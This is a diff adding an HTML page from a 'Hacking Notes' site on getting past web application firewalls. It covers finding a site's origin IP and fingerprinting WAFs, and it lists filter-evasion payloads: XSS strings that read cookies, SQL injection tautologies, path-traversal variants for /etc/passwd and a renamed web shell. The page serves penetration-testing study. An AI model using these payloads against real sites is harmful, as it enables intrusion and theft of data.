@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>WAF Evasion | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="WAF Evasion" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In this section I will explain techniques to found the original IP of the hosted webapp." />
+<meta property="og:description" content="In this section I will explain techniques to found the original IP of the hosted webapp." />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/enumeration/waf-evasion/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/enumeration/waf-evasion/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"In this section I will explain techniques to found the original IP of the hosted webapp.","url":"http://0.0.0.0:4000/hackingnotes/enumeration/waf-evasion/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"WAF Evasion","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Enumeration</h2>
+				<h3>WAF Evasion</h3>
+			</div>
+			<article class="content">
+				<p>In this section I will explain techniques to found the original IP of the hosted webapp.</p>
+
+<h1 id="ssl-certificates">SSL Certificates</h1>
+
+<p>First we need to look inside the SSL Certificate of the webapp in order to find the fingerprint (SHA256)</p>
+
+<p><img src="/hackingnotes/images/fingerprint_ssl.png" alt="Fingerprint of SSL Certifcate" /></p>
+
+<p>With <a href="https://censys.io/certificates">censys</a> you can search different hosted webpages with the same SSL fingerprint, so these are from the same company.</p>
+
+<ul>
+  <li><a href="https://censys.io/certificates">https://censys.io/certificates</a></li>
+</ul>
+
+<p><img src="/hackingnotes/images/censys_waf_bypass.png" alt="Censys results." /></p>
+
+<p>Once you obtained the different domains or IPs that have the same fingerprint try to discover the IPs and play with the <code class="highlighter-rouge">Host HTTP header.</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -kv https://190.12.34.42/
+</code></pre></div></div>
+
+<p>It’s common that the companies buys a range of IPs, so you should need to check more parent IPs.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -kv https://190.12.34.40/
+curl -kv https://190.12.34.41/
+curl -kv https://190.12.34.43/
+curl -kv https://190.12.34.44/
+curl -kv https://190.12.34.45/
+curl -kv https://190.12.34.46/
+</code></pre></div></div>
+
+<h1 id="dns-history">DNS History</h1>
+
+<p>Some times the companies put a WAF on a web application, but they don’t configure it properly and any source IP instead of only the WAF can request the server.</p>
+
+<p>So we can check the DNS history with <code class="highlighter-rouge">viewdnsinfo</code> to search the old IP.</p>
+
+<ul>
+  <li><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a></li>
+</ul>
+
+<p><img src="/hackingnotes/images/viewdns_info.png" alt="ViewDNS.info" /></p>
+
+<p>Finally with <code class="highlighter-rouge">suip.biz</code> we can check which apps are hosted on a server.</p>
+
+<ul>
+  <li><a href="https://suip.biz/?act=hostmap">https://suip.biz/?act=hostmap</a></li>
+</ul>
+
+<p><img src="/hackingnotes/images/suip.png" alt="ViewDNS.info" /></p>
+
+<h1 id="via-smtp-functionalities">Via SMTP Functionalities</h1>
+
+<p>SMTP headers can reveal a lot of value information. If a SMTP functionality is found on the web appliaction try to send a mail to a known recipient to check these headers in order to find the real webserver IP.</p>
+
+<h1 id="bypassing-blacklisting-wafs">Bypassing blacklisting WAFs</h1>
+
+<p>The whitelisting mode is prone to false positives, which is the reason it is very common to find WAFs deployed in blacklisting mode rather than whitelisting mode.</p>
+
+<p>The blacklisting mode is a collection of well-known attacks. WAF producers put together a list of rules to protect a web application against various attack vectors that are used to exploit the most common vulnerabilities.</p>
+
+<p>So we can use different payloads to bypass some filters.</p>
+
+<h2 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h2>
+
+<ul>
+  <li>Instead of using <code class="highlighter-rouge">alert('xss')</code> or <code class="highlighter-rouge">alert(1)</code> we can choose a better option:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prompt('xss')
+prompt(8)
+confirm('xss')
+confirm(8)
+alert(/xss/.source)
+window[/alert/.source](8)
+</code></pre></div>    </div>
+  </li>
+  <li>Instead of using <code class="highlighter-rouge">alert(document.cookie)</code> we can use:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>with(document)alert(cookie)
+alert(document['cookie'])
+alert(document[/cookie/.source])
+alert(document[/coo/.source+/kie/.source])
+</code></pre></div>    </div>
+  </li>
+  <li>Instead of using <code class="highlighter-rouge">&lt;img src=x onerror=alert(1);&gt;</code> we can use:</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;svg/onload=alert(1)&gt;
+&lt;video src=x onerror=alert(1);&gt;
+&lt;audio src=x onerror=alert(1);&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Instead of <code class="highlighter-rouge">javascript:alert(document.cookie)</code> we can use:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data:text/html:base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="blind-sql-injection-blind-sqli">Blind SQL Injection (Blind SQLi)</h2>
+
+<ul>
+  <li>Instead of using <code class="highlighter-rouge">' or 1=1</code> we can use:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' or 6=6
+' or 0x47=0x47
+or char(32)=''
+or 6 is not null
+</code></pre></div>    </div>
+  </li>
+  <li>Instead of <code class="highlighter-rouge">UNION SELECT</code> we can use:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UNION ALL SELECT
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="directoy-traversal">Directoy Traversal</h2>
+
+<ul>
+  <li>Instead of using <code class="highlighter-rouge">/etc/passwd</code> we can use:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/too/../etc/far/../passwd
+/etc//passwd
+/etc/ignore/../passwd
+/etc/passwd.......
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="web-shell">Web Shell</h2>
+
+<ul>
+  <li>Instead of using <code class="highlighter-rouge">c99.php</code> , <code class="highlighter-rouge">r57.php</code> , <code class="highlighter-rouge">shell.aspx</code> , <code class="highlighter-rouge">cmd.jsp</code>, <code class="highlighter-rouge">CmdAsp.asp</code> we can use:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>augh.php
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="waf-detection-and-fingerprinting">WAF Detection and Fingerprinting</h1>
+
+<p>WAF systems leave several footprints of their presence, which allow us to detect which WAF is in place.</p>
+
+<p><code class="highlighter-rouge">wafw00f</code> is a tool that can detect up to 20 different WAF products.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wafw00f www.example.com
+</code></pre></div></div>
+<p>Also it can be possible to detect the WAF vendor with a nmap script.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script=http-waf-fingerprint www.imperva.com -p 80
+</code></pre></div></div>
+<h2 id="cookie-values">Cookie Values</h2>
+
+<p>Some WAF systems reveal their presence through cookies.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">WAF Vendor</th>
+      <th style="text-align: left">Cookies</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">Citrix Netscaler</td>
+      <td style="text-align: left">n_saf, citrix_ns_id or NSC_</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">F5 BIG-IP ASM</td>
+      <td style="text-align: left">^TS[a-zA-Z0-9]{3,6}</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Barracuda</td>
+      <td style="text-align: left">barra_counter_session and BNI__BARRACUDA_LB_COOKIE</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="header-rewrite">Header Rewrite</h2>
+
+<p>Some WAFs rewrite the HTTP headers. Usually modify the Server header.</p>
+
+<ul>
+  <li>Original Request
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Date: Mon, 7 Apr 2014 10:10:50 GMT
+Server: Apache (Unix)
+Content-Type: text/html
+Content-Length: 2506
+</code></pre></div>    </div>
+  </li>
+  <li>Modified Request
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 404 Not Found
+Date: Mon, 7 Apr 2014 10:11:06 GMT
+Server: Netscape-Enterprise/6.1
+Content-Type: text/html; 
+Content-Length: 158
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
